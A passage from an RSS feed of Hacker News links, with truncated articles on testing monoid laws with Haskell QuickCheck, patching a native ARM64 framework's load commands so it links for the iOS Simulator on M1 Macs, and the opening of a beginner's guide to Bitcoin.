<span id="cb3-2">  <span>The</span> Monoid <span>'Natural Numbers under Addition'</span></span>
<span id="cb3-3">    <span>is</span> associative</span>
<span id="cb3-4">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-5">    <span>has</span> 0 as identity (or neutral) <span>element</span></span>
<span id="cb3-6">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb3-7">    <span>is</span> commutative</span>
<span id="cb3-8">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>So behind the scenes, QuickCheck has generated test data for 100 tests for each property under test. For all these data the test cases passed.</p>
<p>This is definitely not a proof. But it gives us some confidence that our math text-books are correct when giving Natural Numbers under addition as an example for a commutative Monoid.</p>
<p>OK, that was easy! Now let’s move to non-commutative Monoids.</p>
<h2 id="non-commutative-monoids">Non-commutative Monoids</h2>
<p>Strings (or any other Lists) under concatenation are a typical example. It’s easy to see that <code>"hello" ++ ("dear" ++ "people")</code> equals <code>"(hello" ++ "dear") ++ "people"</code>, but that <code>"hello" ++ "world"</code> differs from <code>"world" ++ "hello"</code>.</p>
<p>Now let’s try to formalize these intuitions as QuickCheck property based tests again.</p>
<p>First I’m introducing an alias for <code>(++)</code>, as it is defined on any list type, it would be required to have type signatures in all properties (as we had all those <code>:: Natural</code> signatures in the examples above). So I define an operation <code>(⊕)</code> which is only defined on <code>String</code> instances:</p>
<div id="cb4"><pre><code><span id="cb4-1">(⊕)<span> ::</span> <span>String</span> <span>-&gt;</span> <span>String</span> <span>-&gt;</span> <span>String</span></span>
<span id="cb4-2">(⊕) a b <span>=</span> a <span>++</span> b</span></code></pre></div>
<p>Now we can extend our test suite with the following test cases:</p>
<div id="cb5"><pre><code><span id="cb5-1">  describe <span>"The Monoid 'Strings under concatenation'"</span> <span>$</span> <span>do</span></span>
<span id="cb5-2">    </span>
<span id="cb5-3">    it <span>"is associative"</span> <span>$</span> </span>
<span id="cb5-4">      property <span>$</span> \x y z <span>-&gt;</span> ((x ⊕ y) ⊕ z) <span>`shouldBe`</span> (x ⊕ (y ⊕ z))</span>
<span id="cb5-5">      </span>
<span id="cb5-6">    it <span>"has \"\" as left and right identity element"</span> <span>$</span></span>
<span id="cb5-7">      property <span>$</span> \x <span>-&gt;</span> (x ⊕ <span>""</span> <span>`shouldBe`</span> x) <span>.&amp;&amp;.</span> (<span>""</span> ⊕ x <span>`shouldBe`</span> x)</span></code></pre></div>
<p>The output looks promising:</p>
<div id="cb6"><pre><code><span id="cb6-1">  <span>The</span> Monoid <span>'Strings under concatenation'</span></span>
<span id="cb6-2">    <span>is</span> associative</span>
<span id="cb6-3">      <span>+++</span> OK, passed 100 tests.</span>
<span id="cb6-4">    <span>has</span> <span>""</span> as left and right identity element</span>
<span id="cb6-5">      <span>+++</span> OK, passed 100 tests.</span></code></pre></div>
<p>Now let’s try to test the non-commutativity:</p>
<div id="cb7"><pre><code><span id="cb7-1">    it <span>"is NOT commutative"</span> <span>$</span></span>
<span id="cb7-2">      property <span>$</span> \x y <span>-&gt;</span> x ⊕ y <span>`shouldNotBe`</span> y ⊕ x</span></code></pre></div>
<p>But unfortunately the output tells us that this is not true:</p>
<div id="cb8"><pre><code><span id="cb8-1">    <span>is</span> NOT commutative FAILED [1]</span>
<span id="cb8-2"></span>
<span id="cb8-3">  <span>1</span>) <span>Monoid</span>, The Monoid <span>'Strings under concatenation'</span>, is NOT commutative</span>
<span id="cb8-4">       <span>Falsifiable</span> (after 1 test)<span>:</span></span>
<span id="cb8-5">         <span>""</span></span>
<span id="cb8-6">         <span>""</span></span>
<span id="cb8-7">       <span>not</span> expected: <span>""</span></span></code></pre></div>
<p>We formulated the property in the wrong way. The <code>(⊕)</code> <em>may be commutative for some</em> edge cases, e.g.&nbsp;when one or both of the arguments are <code>""</code>. But it is not commutative <em>in general</em> – that is for all possible arguments.</p>
<p>We could rephrase this property as <em>“There exists at least one pair of arguments <span>\((x, y)\)</span> for which <span>\(\oplus\)</span> is not commutative”</em>:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ]\]</span></p>
<p>QuickCheck does not come with a mechanism for <em>existential quantification</em>. But as is has <code>forAll</code>, that is <em>universal quantification</em>. So we can try to make use of the following equivalence:</p>
<p><span>\[\exists (x,y) \left [  x \oplus y \neq y \oplus x \right ] 
  \equiv 
  \neg \forall (x,y) \left [ x \oplus y = y \oplus x \right ]\]</span></p>
<p>Unfortunately we can not write this simply as <code>not forAll</code>, as <code>forAll</code> returns a <code>Property</code> but <code>not</code> expects a <code>Bool</code>. But as explained in <a href="https://stackoverflow.com/questions/42764847/is-there-a-there-exists-quantifier-in-quickcheck">this discussion on Stackoverflow</a> it is still posible to implement our own <code>exists</code>:</p>
<div id="cb9"><pre><code><span id="cb9-1"><span>exists ::</span> (<span>Show</span> a, <span>Arbitrary</span> a) <span>=&gt;</span> (a <span>-&gt;</span> <span>Bool</span>) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-2">exists <span>=</span> forSome <span>$</span> resize <span>1000</span> arbitrary</span>
<span id="cb9-3"></span>
<span id="cb9-4"><span>forSome ::</span> (<span>Show</span> a, <span>Testable</span> prop) <span>=&gt;</span> <span>Gen</span> a <span>-&gt;</span> (a <span>-&gt;</span> prop) <span>-&gt;</span> <span>Property</span></span>
<span id="cb9-5">forSome gen prop <span>=</span></span>
<span id="cb9-6">  mapResult (\r <span>-&gt;</span> r {P.reason <span>=</span> <span>"No witness found."</span>, P.callbacks <span>=</span> []}) <span>$</span></span>
<span id="cb9-7">    once <span>$</span> disjoin <span>$</span> <span>replicate</span> <span>1000</span> <span>$</span> forAll gen prop</span></code></pre></div>
<p>Now we can rewrite the property <span>\(\exists (x,y) \left [ x \oplus y \neq y \oplus x \right ]\)</span> as follows:</p>
<div id="cb10"><pre><code><span id="cb10-1">    it <span>"is not commutative (via exists)"</span> <span>$</span></span>
<span id="cb10-2">      exists <span>$</span> \(x,y) <span>-&gt;</span> x ⊕ y <span>/=</span> y ⊕ x</span></code></pre></div>
<p>I like how close the Haskell code stays to the concise mathematical formulation! The output of this test fits much better into our intuitive understanding:</p>
<div id="cb11"><pre><code><span id="cb11-1">    <span>is</span> not commutative (via exists)</span>
<span id="cb11-2">      <span>+++</span> OK, passed 1 test.</span></code></pre></div>
<h2 id="sequential-mapreduce">Sequential MapReduce</h2>
<blockquote>
<p>MapReduce is a programming model and an associated implementation for processing and generating large data sets. Users specify <strong>a map function</strong> that processes a key/value pair to generate a set of intermediate key/value pairs, <strong>and a reduce function</strong> that merges all intermediate values associated with the same intermediate key.</p>
<p>[This] abstraction is inspired by the map and reduce primitives present in Lisp and many other functional languages. <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/16cb30b4b92fd4989b8619a61752a2387c6dd474.pdf">Quoted from Google Research</a></p>
</blockquote>
<p>I’m not going into more details here, as You’ll find detailed information on this approach and a working example <a href="https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html#map-reduce">in my original article</a>.</p>
<p>Here is the definition of a sequential MapReduce:</p>
<div id="cb12"><pre><code><span id="cb12-1">simpleMapReduce </span>
<span id="cb12-2"><span>  ::</span> (a <span>-&gt;</span> b)   <span>-- map function</span></span>
<span id="cb12-3">  <span>-&gt;</span> ([b] <span>-&gt;</span> c) <span>-- reduce function</span></span>
<span id="cb12-4">  <span>-&gt;</span> [a]        <span>-- list to map over</span></span>
<span id="cb12-5">  <span>-&gt;</span> c          <span>-- result</span></span>
<span id="cb12-6">simpleMapReduce mapFunc reduceFunc <span>=</span> reduceFunc <span>.</span> <span>map</span> mapFunc</span></code></pre></div>
<p>We can test the sequential MapReduce algorithm with the following property based test:</p>
<div id="cb13"><pre><code><span id="cb13-1">    it <span>"works correctly with a sequential map-reduce"</span> <span>$</span></span>
<span id="cb13-2">      property <span>$</span> \a b c d <span>-&gt;</span> (simpleMapReduce <span>reverse</span> (<span>foldr</span> (⊕) <span>""</span>) [a,b,c,d]) </span>
<span id="cb13-3">                     <span>`shouldBe`</span> (<span>reverse</span> a) ⊕ (<span>reverse</span> b) ⊕ (<span>reverse</span> c) ⊕ (<span>reverse</span> d)</span></code></pre></div>
<h3 id="excurs-foldmap">Excurs: foldMap</h3>
<p>What I have shown so far just demonstrates the general mechanism of chaining <code>map</code> and <code>reduce</code> functions without implying any parallel execution. Essentially we are chaining a <code>map</code> with a <code>fold</code> (i.e.&nbsp;reduction) function. In the Haskell base library there is a higher order function <code>foldMap</code> that covers exactly this pattern of chaining. Please note that <code>foldMap</code>does only a single traversal of the foldable data structure. It fuses the <code>map</code> and <code>reduce</code> phase into a single one by function composition of <code>mappend</code> and the mapping function <code>f</code>:</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>-- | Map each element of the structure to a monoid,</span></span>
<span id="cb14-2"><span>-- and combine the results.</span></span>
<span id="cb14-3"><span>foldMap</span><span> ::</span> (<span>Foldable</span> t, <span>Monoid</span> m) <span>=&gt;</span> (a <span>-&gt;</span> m) <span>-&gt;</span> t a <span>-&gt;</span> m</span>
<span id="cb14-4"><span>foldMap</span> f <span>=</span> <span>foldr</span> (<span>mappend</span> <span>.</span> f) <span>mempty</span></span></code></pre></div>
<h2 id="parallel-mapreduce">Parallel MapReduce</h2>
<p>Now we come to the tricky part that kicked off this whole discussion: parallelism.</p>
<p>As an example we consider a simple sequential MapReduce, taking an input list of <code>Int</code>s, computing their squares and computing the sum of these squares:</p>
<div id="cb15"><pre><code><span id="cb15-1">λ<span>&gt;</span> simpleMapReduce (<span>^</span><span>2</span>) (<span>foldr</span> (<span>+</span>) <span>0</span>) [<span>1</span>,<span>2</span>,<span>3</span>,<span>4</span>]</span>
<span id="cb15-2"><span>30</span></span></code></pre></div>
<p>Let’s try to design this as a massively parallelized algorithm:</p>
<ol type="1">
<li><p>Mapping of <code>(^2)</code> over the input-list <code>[1,2,3,4]</code> would be started in parallel to the reduction of the intermediary list of squares by <code>(foldr (+) 0)</code>.</p></li>
<li><p>The mapping phase will be executed as a set of parallel computations (one for each element of the input list).</p></li>
<li><p>The reduction phase will also be executed as a set of parallel computations (one for each addition).</p></li>
</ol>
<p>Of course the reduction phase can begin only when at least one list element is squared. So in effect the mapping process would have to start first. The parallel computation of squares will result in a non-deterministic sequence of computations. In particular it is not guaranteed that all elements of the input list are processed in the original list order. So it might for example …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html">https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</a></em></p>]]>
            </description>
            <link>https://thma.github.io/posts/2021-01-30-How-QuickCheck-destroyed-my-favourite-theory.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112441</guid>
            <pubDate>Fri, 12 Feb 2021 11:16:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking native ARM64 binaries to run on the iOS Simulator]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26112198">thread link</a>) | @bogo_
<br/>
February 12, 2021 | https://bogo.wtf/arm64-to-sim.html | <a href="https://web.archive.org/web/*/https://bogo.wtf/arm64-to-sim.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>
    <time datetime="2021-02-10 23:37:00 +0000">2021-02-10</time>
  </p>

  
  <em>a 21 minute read (and <a href="https://github.com/bogo/arm64-to-sim">sources</a>) by <a href="https://twitter.com/giertler">Bogo Giertler</a></em>

  <p><img src="https://bogo.wtf/assets/images//Full%20Screenshot.png" alt="M1 Simulator + ARM64"></p>

<p>The screenshot above looks perfectly normal - until you realize that the sample app running on this M1 MacBook is actually a legacy Spotify SDK demo from 2017. Its proprietary binary framework has never been rebuilt to support M1 Macs and cannot run on Apple’s newest computers, unless Xcode is launched through <a href="https://developer.apple.com/documentation/apple_silicon/about_the_rosetta_translation_environment">Rosetta 2</a>.</p>

<p>If you have an M1 Mac, you probably already encountered this issue. A couple of seconds after hitting Run on your favorite project (and going <em>wow, those M1 Macs sure are fast!</em>), you were likely greeted with this:</p>

<p><img src="https://bogo.wtf/assets/images//Xcode%20Linker%20Error.png" alt="Xcode Linker Error"></p>

<div><div><pre><code>ld: in ../../SpotifyiOS.framework/SpotifyiOS(MPMessagePackReader.o), building for iOS Simulator, but linking in object file built for iOS, file '../../SpotifyiOS.framework/SpotifyiOS' for architecture arm64
clang: error: linker command failed with exit code 1 (use -v to see invocation)
</code></pre></div></div>

<p>In plain English, the proprietary binary framework you’ve been using in your project has not been updated to support iOS Simulator running on M1 Macs. Apple’s advice in this situation is to reach out to the vendor and ask them to release an updated version of the framework - both by migrating it to an XCFramework format, and by rebuilding it to support M1 simulators.</p>

<p>There is a lot of reasons why you might not get your hands on that updated framework anytime soon - or even at all. Commonly, the third-party vendor is slow to react, or you are pinning to a previous major version of the framework for compatibility reasons. Since you likely do not have sources for the original library, you cannot rebuild it yourself either. This means no Simulator builds and no local unit and UI tests. You seemingly hit a dead end and development on an M1 Mac will be very difficult for time being. Or did you?</p>

<p>Last week, I ran into this issue with <a href="https://github.com/spotify/ios-sdk">Spotify’s iOS SDK</a>. With the binary release not updated for over a year, I had to find a way to hack the native ARM64 binary to run in the Simulator. On the way, I learnt a lot about frameworks, binaries, and loaders.  You can find the complete sources for <a href="https://github.com/bogo/arm64-to-sim">arm64-to-sim</a> on GitHub. What follows is a detailed explanation of the ARM64 transmogrification.</p>

<h2 id="-an-idea-takes-root">💡 An Idea Takes Root</h2>
<p>Let’s take a look at the error message again. The error we receive isn’t actually a compiler error - it’s a linker error. <code>ld</code> complains that we are attempting to link in a binary that was compiled for <em>native</em> ARM64 to a binary that is being built for <em>iOS Simulator</em> ARM64.</p>

<p>Historically, the ARM/x86 bifurcation in the Apple product line meant that one could safely assume that code built for <code>i386</code> and <code>x86_64</code> was meant for the Simulator, and code built for <code>armv7</code> and <code>arm64</code> was meant for native devices. This found reflection in <a href="https://en.wikipedia.org/wiki/Fat_binary">fat (universal) binaries</a> being a widely used hack for distributing frameworks for Apple platforms that could be used both for devices and simulators.</p>

<p>With the release of M1 Macs, this assumption no longer holds true - an ARM64 slice can now be meant for either. Under the guise of supporting macOS, iOS, watchOS, and tvOS in a single framework, in 2019 Apple released a new bundle framework format, <a href="https://developer.apple.com/videos/play/wwdc2019/416/">XCFramework</a>.</p>

<p>This should give us an idea: since, as indicated by the <code>ld</code> error, we already have a native ARM64 slice in our library, maybe we can repackage it as an iOS Simulator-supporting XCFramework. There is no technical reason why it <em>shouldn’t</em> work - a compiled binary links against symbols of other frameworks and binaries. Since iOS devices and M1 Macs use the same ARM64 instruction set, if the symbols of native and Simulator libraries are sufficiently similar, the library should simply work. We will just need to apply a lot of elbow grease.</p>

<h2 id="-the-anatomy-of-a-xcframework">🫀 The Anatomy of a (XC)Framework</h2>
<p>XCFramework is a pretty straightforward format that is meant to be a drop-in replacement for the original Cocoa Frameworks. Essentially, each XCFramework is a directory containing a property list telling the linker where to find architecture- and plaform-specific copies of each framework.</p>

<p>An example XCFramework looks as follows:</p>

<div><div><pre><code>Example.xcframework/
|-- Info.plist
|-- ios-arm64/
|   +-- Example.framework/
+-- ios-arm64_x86_64-simulator/
    +-- Example.framework/
</code></pre></div></div>

<p>The actual mapping of individual frameworks to platforms is done in the <code>Info.plist</code> file. Notice the <code>SupportedArchitectures</code>, <code>SupportedPlatform</code>, and <code>SupportedPlatformVariant</code> properties.</p>

<div><div><pre><code><span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span>
<span>&lt;plist</span> <span>version=</span><span>"1.0"</span><span>&gt;</span>
<span>&lt;dict&gt;</span>
	<span>&lt;key&gt;</span>AvailableLibraries<span>&lt;/key&gt;</span>
	<span>&lt;array&gt;</span>
		<span>&lt;dict&gt;</span>
			<span>&lt;key&gt;</span>LibraryIdentifier<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>ios-arm64<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>LibraryPath<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>Example.framework<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>SupportedArchitectures<span>&lt;/key&gt;</span>
			<span>&lt;array&gt;</span>
				<span>&lt;string&gt;</span>arm64<span>&lt;/string&gt;</span>
			<span>&lt;/array&gt;</span>
			<span>&lt;key&gt;</span>SupportedPlatform<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>ios<span>&lt;/string&gt;</span>
		<span>&lt;/dict&gt;</span>
		<span>&lt;dict&gt;</span>
			<span>&lt;key&gt;</span>LibraryIdentifier<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>ios-arm64_x86_64-simulator<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>LibraryPath<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>Example.framework<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>SupportedArchitectures<span>&lt;/key&gt;</span>
			<span>&lt;array&gt;</span>
				<span>&lt;string&gt;</span>arm64<span>&lt;/string&gt;</span>
				<span>&lt;string&gt;</span>x86_64<span>&lt;/string&gt;</span>
			<span>&lt;/array&gt;</span>
			<span>&lt;key&gt;</span>SupportedPlatform<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>ios<span>&lt;/string&gt;</span>
			<span>&lt;key&gt;</span>SupportedPlatformVariant<span>&lt;/key&gt;</span>
			<span>&lt;string&gt;</span>simulator<span>&lt;/string&gt;</span>
		<span>&lt;/dict&gt;</span>
	<span>&lt;/array&gt;</span>
	<span>&lt;key&gt;</span>CFBundlePackageType<span>&lt;/key&gt;</span>
	<span>&lt;string&gt;</span>XFWK<span>&lt;/string&gt;</span>
	<span>&lt;key&gt;</span>XCFrameworkFormatVersion<span>&lt;/key&gt;</span>
	<span>&lt;string&gt;</span>1.0<span>&lt;/string&gt;</span>
<span>&lt;/dict&gt;</span>
<span>&lt;/plist&gt;</span>
</code></pre></div></div>

<p>After creating a relevant folder structure and dropping in an <code>Info.plist</code> alongside our legacy <code>.framework</code>, we should now have a real <code>.xcframework</code> on our hands. Let’s emplace the original <code>.framework</code> in Xcode with it and try to build. Of course, it would be too easy if it worked - instead, we get the following:</p>

<p><img src="https://bogo.wtf/assets/images//Xcode%20Linker%20Error%20with%20XCFramework.png" alt="Xcode Linker Error - with XCFramework"></p>

<div><div><pre><code>ld: in /Users/bogo/Library/Developer/Xcode/DerivedData/NowPlayingView-aeukgqexpeqlsrdzslkpeehveixs/Build/Products/Debug-iphonesimulator/SpotifyiOS.framework/SpotifyiOS(MPMessagePackReader.o), building for iOS Simulator, but linking in object file built for iOS, file '/Users/bogo/Library/Developer/Xcode/DerivedData/NowPlayingView-aeukgqexpeqlsrdzslkpeehveixs/Build/Products/Debug-iphonesimulator/SpotifyiOS.framework/SpotifyiOS' for architecture arm64
clang: error: linker command failed with exit code 1 (use -v to see invocation)
</code></pre></div></div>

<p>Since the Cocoa Framework is coming from <code>DerivedData</code>, we can be sure we assembled our XCFramework correctly. Still, we are back to square one - despite our naïve wrapping, the linker can still tell that we are bringing in a native library. Here’s our new objective: to find a way to convince <code>ld</code> that the library is actually a Simulator library.</p>

<h2 id="️-into-the-binary">🕵️ Into the Binary</h2>

<p>Let’s take a look inside our framework and see what files could be informing it about the platform.</p>

<div><div><pre><code>Example.framework/
|-- Info.plist
|-- Example
|-- Headers/
|   |-- A.h
|   |-- B.h
|   +-- C.h
+-- Modules/
    +-- module.modulemap
</code></pre></div></div>

<p>Cursory browsing of the human-readable contents of the framework does not yield any hints, so the linker must be using the contents of the binary file itself to infer the Simulator information. Since, we don’t really know what to look for, let’s dig into the binaries of other XCFrameworks out there first.</p>

<p><a href="https://github.com/firebase/firebase-ios-sdk/blob/master/Package.swift#L244">FirebaseAnalytics.xcframework</a> is a particularly good XCFramework to investigate - it contains both native and Simulator binaries. The obvious first idea is to search for Simulator references in the human-readable strings of the binary:</p>

<div><div><pre><code><span># in the FirebaseAnalytics.xcframework directory</span>
<span>$ </span>strings ios-arm64_i386_x86_64-simulator/FirebaseAnalytics.framework/FirebaseAnalytics | <span>grep</span> <span>-i</span> sim
</code></pre></div></div>

<p>The result is a bunch of rather uninteresting strings, none of them mentioning the Simulator. We can make an educated guess that the Simulator information is thus encoded in the machine-readable segment of the binary. To extract it, we can use <code>otool</code> - a tool meant to explore the executable files produced by LLVM. The <code>-fahl</code> parameter prints the relevant  fat, archive, and Mach-O headers, as well as the load commands.</p>

<div><div><pre><code><span># in the FirebaseAnalytics.xcframework directory</span>
<span>$ </span>otool <span>-fahl</span> ios-arm64_i386_x86_64-simulator/FirebaseAnalytics.framework/FirebaseAnalytics
<span>(</span>...<span>)</span>
Load <span>command </span>2
      cmd LC_LINKER_OPTIMIZATION_HINT
  cmdsize 16
  dataoff 12464
 datasize 760
Load <span>command </span>3
     cmd LC_SYMTAB
 cmdsize 24
  symoff 13224
   nsyms 201
  stroff 16440
 strsize 5064
<span>(</span>...<span>)</span>
</code></pre></div></div>

<p>Whoops, that’s a lot of data! The offsets and addresses and sizes are doing us no good and are likely to be different between platforms. Let’s constrain our search to load commands, save the results, and compare them:</p>

<div><div><pre><code><span># in the FirebaseAnalytics.xcframework directory</span>
<span>$ </span>otool <span>-fahl</span> ios-arm64_i386_x86_64-simulator/FirebaseAnalytics.framework/FirebaseAnalytics | <span>grep</span> <span>-E</span> <span>'cmd |\.o'</span> <span>&gt;</span> simulator_cmds

<span>$ </span>otool <span>-fahl</span> ios-arm64_armv7/FirebaseAnalytics.framework/FirebaseAnalytics | <span>grep</span> <span>-E</span> <span>'cmd |\.o'</span> <span>&gt;</span> native_cmds

<span>$ </span>diff <span>-u</span> native_cmds simulator_cmds
<span>-ios-arm64_armv7</span>/FirebaseAnalytics.framework/FirebaseAnalytics<span>(</span>FirebaseAnalytics_vers.o<span>)</span>:
+ios-arm64_i386_x86_64-simulator/FirebaseAnalytics.framework/FirebaseAnalytics<span>(</span>FirebaseAnalytics_vers.o<span>)</span>:
       cmd LC_SEGMENT_64
-      cmd LC_VERSION_MIN_IPHONEOS
+      cmd LC_BUILD_VERSION
      cmd LC_SYMTAB
<span>(</span>...<span>)</span>
</code></pre></div></div>

<p>Alright, we got a match! Seems that the Simulator binary contains  an <code>LC_BUILD_VERSION</code> load command, while the native binary contains an <code>LC_VERSION_MIN_IPHONEOS</code> load command in the same place. A pass with <code>otool</code> on our unsupported, native-only <code>.framework</code> confirms this theory. A bit of Googling reveals that <a href="https://reviews.llvm.org/D85358">this specific difference</a> is used by LLDB to distinguish Simulator and native binaries. We are on the right track then - looks like substituting <code>LC_VERSION_MIN_IPHONEOS</code> with <code>LC_BUILD_VERSION</code> might be just enough to fool <code>ld</code>.</p>

<h2 id="-meet-the-librarian">📚 Meet the Librarian</h2>
<p>So far, we’ve been playing with a fat binary, containing multiple platform-specific slices. We can see architectures available in a binary using the <code>file</code> command:</p>

<div><div><pre><code><span>$ </span>file Example.framework/Example</code></pre></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bogo.wtf/arm64-to-sim.html">https://bogo.wtf/arm64-to-sim.html</a></em></p>]]>
            </description>
            <link>https://bogo.wtf/arm64-to-sim.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26112198</guid>
            <pubDate>Fri, 12 Feb 2021 10:30:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner’s Guide to Getting Started with Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26112188">thread link</a>) | @crecker
<br/>
February 12, 2021 | https://serhack.me/articles/getting-started-with-bitcoin/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/getting-started-with-bitcoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://serhack.me/images/bitcoin-getting-started/social_oasis.jpg"><figcaption><h4>A man looks for Bitcoin Oasis</h4></figcaption></figure><p>If you have heard about blockchain or cryptocurrency, then the term that initially comes to mind is <a href="https://bitcoin.org/">Bitcoin</a>. Launched 12 years ago, it was the late 2017 bull run that created a media frenzy that propelled Bitcoin into the mainstream and our modern day lexicon.</p><p>Often labeled as the “original” cryptocurrency, <a href="https://bitcoin.org/">Bitcoin</a> has been the catalyst (directly and/or indirectly) behind many new innovations in the blockchain and digital asset space, most notably <a href="https://ethereum.org/">Ethereum</a> and <a href="https://getmonero.org/">Monero</a>. Shortly after the late 2017 bull run lost its steam, interest in these new technologies started to fade ― but here we are in 2021 with Bitcoin having risen like a phoenix from the ashes. As you would assume, an appetite for the blockchain and digital asset space has returned and now it is more important than ever that we understand what exactly is behind this unique asset, Bitcoin.</p><p>This article is meant to be a guide for individuals who are new to cryptocurrency and want to learn about <a href="https://bitcoin.org/">Bitcoin</a>, specifically its use case and the different ways to become involved in the broader blockchain and digital asset space. My goal is to educate you on the basics and make sure that you walk away with a newfound perspective and understanding of <a href="https://bitcoin.org/">Bitcoin</a>.</p><h2 id="what-is-bitcoin">What is Bitcoin?</h2><p>Bitcoin is a peer-to-peer version of electronic cash whose transactions are recorded in a public distributed ledger called a blockchain. In late October 2008, Satoshi Nakamoto (whose identity is still unknown) published a white paper titled <a href="https://bitcoin.org/bitcoin.pdf"><em>Bitcoin: A Peer-to-Peer Electronic Cash System</em></a> on bitcoin.org (registered in August 2008) and subsequently posted it to <a href="https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html">a cryptography mailing list</a>. On January 3, 2009, the Bitcoin network was created when Satoshi Nakamoto mined the initial block of the chain, which is called the genesis block.</p><p>In essence, Bitcoin is a decentralized type of “digital money” that can be used by anyone around the world, at any time, and without restrictions or a central authority. Bitcoin is not backed by any bank or government and originally allowed users to freely send and/or spend it anywhere without trusting third parties.</p><p>At inception, the price of Bitcoin was approximately $0.01 and, as of today, the price has surpassed $40,000 per coin ― with many believing that it can grow exponentially higher to levels between $100,000 and $250,000 in the next year or so.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_1_blockchain-80.jpg"><figcaption><h4>The transactions data are memorized through a chain-of-blocks</h4></figcaption></figure><p>Given that Bitcoin exists and operates within the confounds of the Internet, all user balances are kept on an immutable and fully transparent blockchain. Put simply, each Bitcoin transaction is broadcasted to the Bitcoin network and grouped with several other transactions in the form of a block, which the network’s miners validate. Once the block is accepted, the transactions get recorded on the blockchain (which, as you may recall, is a public ledger). Whenever this process is successfully completed, the network distributes new Bitcoin to miners for each block that has been validated ― this is referred to as a block reward.</p><p>The peculiarity of the blockchain is its distribution and decentralized properties, as all the nodes share a valid copy of the public ledger. In the Bitcoin network, nodes play a very important role ― think of them as “protectors” who are constantly monitoring Bitcoin’s blockchain to distinguish legitimate Bitcoin transactions from illegitimate ones. The basic job of a node is to prevent attempts to double-spend Bitcoins that have already been spent elsewhere. In addition, the process of mining is essential to validating transactions, as it ensures the overall trustworthiness and security of the payment network.</p><h2 id="advantages-and-limitations">Advantages and Limitations</h2><p>Members of the cryptocurrency community, who range from the tech savvy to your average retail investor, have adopted various perspectives regarding the fundamental driver of Bitcoin’s value (both in financial and non-financial terms).</p><p>On one side, there are the Bitcoin Maximalists who believe that Bitcoin is the ultimate financial innovation and will assume a mainstream role in global society ― to maximalists, other cryptocurrencies and traditional financial instruments are inferior. On the other side, you have cryptocurrency enthusiasts who believe Bitcoin’s technology is outdated and that other cryptocurrencies, such as Ethereum, have more expansive utility.</p><p>These arguments and differences of opinion (as it relates to Bitcoin) can often become confusing, so let’s dig deeper into some of the most common discussion points with hopes that you can decipher for yourself.</p><h3 id="advantages">Advantages</h3><ul><li>A blockchain is managed autonomously using <strong>a peer-to-peer network</strong> and cannot be shut down ― the only way to stop it is through shutting down or banning Internet access. (Note: Even though a blockchain or Bitcoin cannot be shut down, some jurisdictions have imposed restrictions on citizens that limit or ban the holding or trading of Bitcoin and/or other cryptocurrencies.)</li><li>There is no need to trust a third party. <strong>You are your own bank!</strong></li><li>Relatively quick and cheap transactions without intermediary fees (around 10 minutes on average per transaction), when compared to most leading cryptocurrencies.</li><li>Increasing adoption by merchants and individuals across the globe.</li><li>Largest market capitalization and name recognition, which will continue to promote its growth and (hopefully) price stability.</li></ul><h3 id="limitations">Limitations</h3><ul><li><strong>Lack of anonymity</strong> as transactions that take place in the Bitcoin network, along with many other leading cryptocurrencies, are fully transparent and can potentially be linked via chain analysis. In addition, strict AML/KYC regulations require many of the leading cryptocurrency trading exchanges to verify your most sensitive personal information.</li><li>Slow and expensive transactions, when compared to lesser known cryptocurrencies that can be sent within seconds and at a fraction of the cost.</li><li>Irreversible transactions. Once a transaction is sent, you cannot undo or cancel the transaction.</li><li>Achievement of its status as a currency will be challenging due to its volatile nature (i.e. swings in price) and regulations.</li><li>The core technology has some subtle limits that make Bitcoin outdated in comparison with other cryptocurrencies.</li></ul><p>Along with Bitcoin Maximalists and cryptocurrency enthusiasts, you have many individuals who simply like to be long-term holders of Bitcoin (because they believe in the fundamentals and value proposition) and others who speculate on the short-term price (e.g. day traders).</p><p>Whatever side you are on, there is no question that Bitcoin has established itself as a serious contender in the financial world and is here to stay for the time being. There may be other alternatives, but the granddaddy of cryptocurrencies still has the spotlight!</p><h2 id="how-to-obtain-bitcoin-from-an-exchange">How to Obtain Bitcoin from an Exchange</h2><p>Now that you have an understanding of Bitcoin and its utility, you may be interested in purchasing some. If that is the case, you have come to the right place as buying it is now easier than ever due to the growing number of exchanges and companies making 